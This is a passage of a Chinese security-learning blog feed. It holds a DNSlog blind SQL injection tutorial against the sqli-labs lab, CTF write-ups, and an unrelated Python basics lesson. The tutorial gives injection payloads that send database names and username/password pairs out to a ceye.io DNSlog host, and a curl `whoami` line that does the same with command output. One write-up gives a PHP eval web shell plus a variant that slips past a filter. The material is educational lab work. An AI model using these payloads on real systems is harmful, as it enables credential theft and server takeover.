      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/7.Dnslog%E7%9B%B2%E6%B3%A8/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/7.Dnslog%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p> 什么是DNS？我们在进行网页浏览的时候，通常会输入一段URL，而我们访问服务器用的则是服务器的IP地址。从URL转换到IP地址，这个就是DNS的作用了</p><p>我们在配置网络的时候，都会配置DNS地址，浏览器或者应用访问URL，首先会去查找本地的hosts文件，如果没有，就会发送请求到DNS服务器，由DNS服务器查询到对应的IP地址后，返回本机，再由本机访问IP地址，达到访问对应资源的目的</p><p>由于这一切很快，所以对于人来说是无感的</p><p> 说回DNS，用户访问DNS的时候，DNS服务器会记录用户对域名的访问信息，这个被称为Dnslog</p><a id="more"></a><hr><h1 id="DNSlog注入原理"><a href="#DNSlog注入原理" class="headerlink" title="DNSlog注入原理"></a>DNSlog注入原理</h1><p>这是建立在sqlibs下demo文件夹的dnslog.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL&amp;~E_WARNING);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Right&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到代码存在着SQL漏洞，但是页面不会回显数据，也不会回显错误，虽然我们可以通过布尔注入和延时注入获取到内容，但是效率太低，需要发送很多的请求，容易触发安全设备的防护机制，这时候就需要使用到dnslog实现注入</p><h2 id="Dnslog原理"><a href="#Dnslog原理" class="headerlink" title="Dnslog原理"></a>Dnslog原理</h2><p>Dnslog注入需要使用到平台，互联网中有很多的平台，也可以自己搭建</p><blockquote><p>Dnslog平台：<a href="http://ceye.io/">http://ceye.io</a></p></blockquote><p>我们注册之后可以获得一个网页链接</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808232422314.png" alt="image-20200808232422314"></p><p>使用curl去访问这个链接，就可以获得dns query</p><p>我们使用Linux访问一下</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808233536310.png" alt="image-20200808233536310"></p><p>然后刷新一下平台</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808233557457.png" alt="image-20200808233557457"></p><p>就可以看到请求的信息，然后我们对请求进行一下修改</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808233721643.png" alt="image-20200808233721643"></p><p>再看一下平台</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808233743746.png" alt="image-20200808233743746"></p><p>发现这个会跟着二级域名一样会被记录下来</p><p>那么，再来一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#96;whoami&#96;.z9ah21.ceye.io</span><br></pre></td></tr></table></figure><p>注意:这是反引号不是引号</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808234246793.png" alt="image-20200808234246793"></p><p>这里就会显示我现在使用的账号</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808234336609.png" alt="image-20200808234336609"></p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在Mysql中，LOAD_FILE函数也可以发起http请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,&#39;test&#39;,&#39;.z9ah21.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810153509773.png" alt="image-20200810153509773"></p><p>查看结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810153523171.png" alt="image-20200810153523171"></p><h3 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database()),&#39;.z9ah21.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure><p>通过SQL语句查询内容，作为请求的一部分，发送至DNSLOG平台，只要对这一部分语句进行构造，就能实现有回显的注入，值得注意的是，这些数据格式和内容都有限制，需要一些处理</p><blockquote><p>使用LOAD_FILE函数进行盲注，目标一定要是windows操作系统</p></blockquote><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810173242632.png" alt="image-20200810173242632"></p><p>查看一下结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810173328831.png" alt="image-20200810173328831"></p><p>结果输出成功</p><h3 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.z9ah21.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure><p>查询结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810174225432.png" alt="image-20200810174225432"></p><h2 id="实际练习"><a href="#实际练习" class="headerlink" title="实际练习"></a>实际练习</h2><p>我们使用第九关进行测试，注意，这次试验需要sqlilabs创建在windows系统中</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810174938359.png" alt="image-20200810174938359"></p><p>看到第九关的代码，我们知道，无论SQL执行结果如何，返回都将是You are in………..以及传值接收为单引号</p><h3 id="查询第二张数据表"><a href="#查询第二张数据表" class="headerlink" title="查询第二张数据表"></a>查询第二张数据表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),&#39;.z9ah21.ceye.io\\abc&#39;))-- #</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810175815277.png" alt="image-20200810175815277"></p><p>查询结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810175743844.png" alt="image-20200810175743844"></p><p>我们就知道第二张表的名字叫referers</p><h3 id="查询用户名密码"><a href="#查询用户名密码" class="headerlink" title="查询用户名密码"></a>查询用户名密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select concat_ws(&#39;A&#39;,username,password) from security.users limit 0,1),&#39;.z9ah21.ceye.io\\abc&#39;))-- #</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810191142790.png" alt="image-20200810191142790"></p><p>结果出来了，因为Dnslog平台很多的特殊符号不允许使用，所以，这里采用的是A来进行分隔</p><h3 id="使用哈希值来返回结果"><a href="#使用哈希值来返回结果" class="headerlink" title="使用哈希值来返回结果"></a>使用哈希值来返回结果</h3><p>我们上文说到Dnslog平台很多的特殊符号不允许使用，但是有时候确实使用字母不方便，那么我们还可以使用哈希值来进行返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from security.users limit 0,1),&#39;.z9ah21.ceye.io\\abc&#39;))-- #</span><br></pre></td></tr></table></figure><p>返回结果：</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810200333988.png" alt="image-20200810200333988"></p><p>哈希转化：</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200810200911776.png" alt="image-20200810200911776"></p><h2 id="工具源码"><a href="#工具源码" class="headerlink" title="工具源码"></a>工具源码</h2><p>课程老师写了一个注入工具，以我python编程能力只能押后再看，有点难</p><p><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8.合天网安第八题-随意的上传</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/8.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%85%AB%E9%A2%98-%E9%9A%8F%E6%84%8F%E7%9A%84%E4%B8%8A%E4%BC%A0%20%20/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/8.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%85%AB%E9%A2%98-%E9%9A%8F%E6%84%8F%E7%9A%84%E4%B8%8A%E4%BC%A0%20%20/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第八题-随意的上传  </p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=3e8dbf39-d7a3-49f9-a87b-a93d65d7762a">https://www.hetianlab.com/expc.do?ce=3e8dbf39-d7a3-49f9-a87b-a93d65d7762a</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>题目简介：</p><p>想传什么就传什么，无所谓！<br>flag在/var/www/html/flag.php</p><p>目标机：Centos7 IP地址：10.1.1.147:5007</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><p>随意到不提供工具？你打开C盘的tools看看呢~</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>直接打开看，平平无奇上传页面</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808092556444.png" alt="image-20200808092556444"></p><p>查看源代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808092702505.png" alt="image-20200808092702505"></p><p>目前没找到什么可用价值</p><p>然后还是上传图片</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808092807599.png" alt="image-20200808092807599"></p><p>上传完了没反应</p><p>写个一句话木马上传</p><p>a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接上传</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808092939311.png" alt="image-20200808092939311"></p><p>可我不知道上传到哪儿去了，还是打开burp抓一下包把</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808093033569.png" alt="image-20200808093033569"></p><p>原来如此，找到C盘tools打开中国菜刀连</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808093321160.png" alt="image-20200808093321160"></p><p>发现连不上</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808093352162.png" alt="image-20200808093352162"></p><p>而且这个文件的源代码变成了<code>@eval($_POST[&#39;1&#39;])?&gt;</code></p><p>把<code>&lt;?php</code>过滤了，我们直接使用script代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;pHp&quot;</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;1&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808093749092.png" alt="image-20200808093749092"></p><p>读取成功找到了flag</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808093804230.png" alt="image-20200808093804230"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2.计算机基础之简述编程语言、计算机组成、平台的基础概念</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/2.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E3%80%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/2.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E4%B9%8B%E7%AE%80%E8%BF%B0%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E3%80%81%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E3%80%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>我们之前已经完成了对于Python解释器与编辑器的安装，在正式进入Python的学习之前，我们还想需要对一些编程的基础进行一些总结回顾</p><hr><h1 id="什么是编程语言？"><a href="#什么是编程语言？" class="headerlink" title="什么是编程语言？"></a>什么是编程语言？</h1><p>编程语言的本质就是人与计算机沟通的语言。</p><h2 id="编程语言简史"><a href="#编程语言简史" class="headerlink" title="编程语言简史"></a>编程语言简史</h2><p>计算机又被称为电脑，人类创造出计算机是为了能够代替部分人们的工作，将庞大的计算工作交给计算机进行，如果计算机无法知晓我们的命令，那他就是一坨废铜烂铁。计算机刚出来的时候使用的是机器语言，机器语言是CPU唯一能够直接读懂的编程语言，最初程序员们是由0和1所代表的打孔条来控制高低电频完成计算机的控制，但这无疑对人们使用计算机的门槛提升到了天堑</p><a id="more"></a><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#机器语言</span><br><span class="line"></span><br><span class="line">来源:https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;108676916</span><br><span class="line"></span><br><span class="line"> 用二进制代码0和1描述的指令称为机器指令，由于计算机内部是基于二进制指令工作的，所以机器语言是直接控制计算机硬件。</span><br><span class="line"></span><br><span class="line">用机器语言编写程序，编程人员要首先熟记所用计算机的全部指令代码以及代码的含义，然后在编写程序时，程序员得自己处理每条指令和每一数据的存储分配和输入输出，还得记住编程过程中每步所使用的工作单元处在何种状态。这是一件十分繁琐的工作。编写程序花费的时间往往是实际运行时间的几十倍或几百倍。而且，编出的程序全是些0和1的指令代码，直观性差，不便阅读和书写，还容易出错，且依赖于具体的计算机硬件型号，局限性很大。除了计算机生产厂家的专业人员外，绝大多数的程序员已经不再去学习机器语言了。</span><br><span class="line"></span><br><span class="line">机器语言是被微处理器理解和使用的，存在有多至100000种机器语言的指令，下述是一些简单示例</span><br><span class="line"></span><br><span class="line">#指令部份的示例</span><br><span class="line">0000 代表 加载（LOAD）</span><br><span class="line">0001 代表 存储（STORE）</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#暂存器部份的示例</span><br><span class="line">0000 代表暂存器 A</span><br><span class="line">0001 代表暂存器 B</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">#存储器部份的示例</span><br><span class="line">000000000000 代表地址为 0 的存储器</span><br><span class="line">000000000001 代表地址为 1 的存储器</span><br><span class="line">000000010000 代表地址为 16 的存储器</span><br><span class="line">100000000000 代表地址为 2^11 的存储器</span><br><span class="line"></span><br><span class="line">#集成示例</span><br><span class="line">0000,0000,000000010000 代表 LOAD A, 16</span><br><span class="line">0000,0001,000000000001 代表 LOAD B, 1</span><br><span class="line">0001,0001,000000010000 代表 STORE B, 16</span><br><span class="line">0001,0001,000000000001 代表 STORE B, 1[1]</span><br></pre></td></tr></table></figure></blockquote><p>在前人们的不断努力之下，引入大量助记符，由助记符编译成机器码发明出来汇编语言</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#汇编语言</span></span><br><span class="line">来源:https://zhuanlan.zhihu.com/p/<span class="number">108676916</span></span><br><span class="line">汇编语言的实质和机器语言是相同的，都是直接对硬件操作，只不过指令采用了英文缩写的标识符，更容易识别和记忆。它同样需要编程者将每一步具体的操作用命令的形式写出来。汇编程序的每一句指令只能对应实际操作过程中的一个很细微的动作。例如移动、自增，因此汇编源程序一般比较冗长、复杂、容易出错，而且使用汇编语言编程需要有更多的计算机专业知识，但汇编语言的优点也是显而易见的，用汇编语言所能完成的操作不是一般高级语言所能够实现的，而且源程序经汇编生成的可执行文件不仅比较小，而且执行速度很快。</span><br><span class="line"></span><br><span class="line">汇编的hello world，打印一句hello world, 需要写十多行，如下</span><br><span class="line"></span><br><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db <span class="string">&quot;Hello, world!&quot;</span>, <span class="number">0xA</span>     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">        section .text            ; 代码段声明</span><br><span class="line">        <span class="keyword">global</span> _start            ; 指定入口函数</span><br><span class="line">        _start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, <span class="number">1</span>       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, <span class="number">4</span>       ; 系统调用号(sys_write) </span><br><span class="line">        int <span class="number">0x80</span>         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, <span class="number">0</span>       ; 参数一：退出代码</span><br><span class="line">        mov eax, <span class="number">1</span>       ; 系统调用号(sys_exit) </span><br><span class="line">        int <span class="number">0x80</span>         ; 调用内核功能</span><br></pre></td></tr></table></figure></blockquote><p>逐渐开始向人类语言习惯进行转换，后来，计算机编程语言演化出了高级语言的面向过程语言、面向对象语言，逐步形成了今天的样子</p><h2 id="高级语言分类"><a href="#高级语言分类" class="headerlink" title="高级语言分类"></a>高级语言分类</h2><p>高级语言分类普遍有两种分法，面向过程和面向对象以及解释型语言和编译型语言</p><p>Python是面向对象的解释型语言，由于面向对象的含义会在后续讲到，而且解释型语言和编译型语言给人的感官更为直接，所以首先介绍解释型语言和编译型语言</p><h3 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h3><p>解释型语言不直接转换为机器语言，而是转换成中间代码（例如java转换成字节码），在运行的时候，中间代码发送给解释器，解释器逐句翻译交给CPU执行</p><p>解释型语言所写的程序，由于还需要解释器进行翻译，所以运行效率略低，但是，不同平台的问题可以通过使用不同平台对应的解释器进行解决，所以，同一个程序可以在不同的平台上运行</p><h3 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h3><p>编译型语言在开发完成后就要进行编译，编译过程是先转换成汇编语言，再编译成机器语言，最后在运行的时候直接交给CPU进行执行</p><p>编译型语言所写的程序，可以直接交给CPU进行执行，所以运行效率高，但是不同平台底层并不兼容，所以不能跨平台跨系统</p><blockquote><p>Java由于字节码与虚拟机的特例性，目前对于它到底属于解释型语言还是编译型语言，每个人都有不同的看法</p></blockquote><h2 id="效用对比"><a href="#效用对比" class="headerlink" title="效用对比"></a>效用对比</h2><p> 开发效率</p><p> 　　（解释型 &gt; 编译型） &gt; 汇编语言 &gt; 机器语言</p><p> 执行效率</p><p> 　　机器语言 &gt; 汇编语言 &gt; (编译型 &gt; 解释型)</p><p>跨平台性：解释型具有极强的跨平台型，而编译型语言需要重新编译调整</p><hr><h1 id="计算机组成"><a href="#计算机组成" class="headerlink" title="计算机组成"></a>计算机组成</h1><p>聊完了编程语言，我们还需要对计算机的基本组成有简单的了解</p><h2 id="计算机的五大部分"><a href="#计算机的五大部分" class="headerlink" title="计算机的五大部分"></a>计算机的五大部分</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/1036857-20180314171523158-1421724255.png" alt="img"></p><ul><li><p>控制器      计算机的指挥系统，控制计算器其他组件工作</p></li><li><p>运算器      运算器包括数学运算与逻辑运算</p><p>控制器+运算器=CPU</p></li><li><p>存储器      计算机的记忆功能，负责数据的存储</p><ul><li>存储器区分：使用的时候首要要从外存提取到内存中等待运算器与控制区读取<ul><li>内存：又被称为主存储器，基于电工作，存取速度快，但只能临时存储数据，掉电则丢失数据</li><li>外存：又被称为外部存储设备，例如硬盘，基于磁工作，存取速度相对慢，理论可以永久保存数据</li></ul></li></ul></li><li><p>输入(Input)设备      键盘、鼠标等</p></li><li><p>输出(output)设备      显示器、打印机等</p></li></ul><h2 id="软件工作流程简述"><a href="#软件工作流程简述" class="headerlink" title="软件工作流程简述"></a>软件工作流程简述</h2><p>程序最先是存放于硬盘中的，程序运行，CPU发出指令，将程序和数据由硬盘加载至内存，CPU与内存读取存储：指令和临时数据，完成程序交互后才将指令和(临时)数据存放到硬盘</p><p>由于CPU的存取指令与输入输出的数据都直接来自于内存的交换，所以内存被称为主存</p><hr><h1 id="平台与操作系统"><a href="#平台与操作系统" class="headerlink" title="平台与操作系统"></a>平台与操作系统</h1><h2 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h2><p>我们常说跨平台概念，那么平台是什么呢？</p><p>平台具体指的是应用程序的运行平台或者说是用户的使用平台</p><p>平台简单来说就是操作系统+计算机硬件</p><p>主流平台</p><ul><li>windows+某款硬件</li><li>linux+某款硬件</li><li>ios+iphone/ipad</li><li>安卓系统+某个厂商的硬件</li></ul><p>跨平台就是多个平台不需要单独编译就可以直接使用</p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>操作系统是一个协调、管理、控制计算机的硬件资源与应用软件资源的一个控制程序，位于计算机硬件与应用软件间，起到承上启下的作用。</p><p>它的核心功能是控制计算机硬件的基本运行，把使用硬件的复杂操作封装成简单的功能，提供给上层应用程序或用户使用。</p><blockquote><p>操作系统都有一个文件系统概念</p><p>文件系统就是操作系统给应用程序/用户操作硬盘的功能</p></blockquote><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>计算机硬件是死的，计算机硬件的运行都受软件控制，所以软件相当于计算机的灵魂</p><h3 id="软件分类"><a href="#软件分类" class="headerlink" title="软件分类"></a>软件分类</h3><ul><li>应用软件：应用程序相关逻辑</li><li>系统软件：控制底层硬件，并向上提供接口</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>7.合天网安第七题-再见上传</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/7.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%83%E9%A2%98-%E5%86%8D%E8%A7%81%E4%B8%8A%E4%BC%A0%20/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/7.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E4%B8%83%E9%A2%98-%E5%86%8D%E8%A7%81%E4%B8%8A%E4%BC%A0%20/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第七题-再见上传 </p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=4ce866ee-a182-43a1-9239-0745a52d611e">https://www.hetianlab.com/expc.do?ce=4ce866ee-a182-43a1-9239-0745a52d611e</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5007</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>首先声明：我太菜，实在没想到实在没想到</p><p>首先打开网页看看</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808010425477.png" alt="image-20200808010425477"></p><p>网页源代码发现了上传目标PHP文件</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808010631447.png" alt="image-20200808010631447"></p><p>打开看一眼</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808010709354.png" alt="image-20200808010709354"></p><p>然后老规矩，打开burp，抓包，上传合天网安图片</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808010827403.png" alt="image-20200808010827403"></p><p>抓包，然后丢测试器</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808010908170.png" alt="image-20200808010908170"></p><p>他要求上传PHP文件，还是修改一下上传文件名吧，不过刚才看到了应该是不可以的</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808011000669.png" alt="image-20200808011000669"></p><p>然后我就卡住了，百度找到了<a 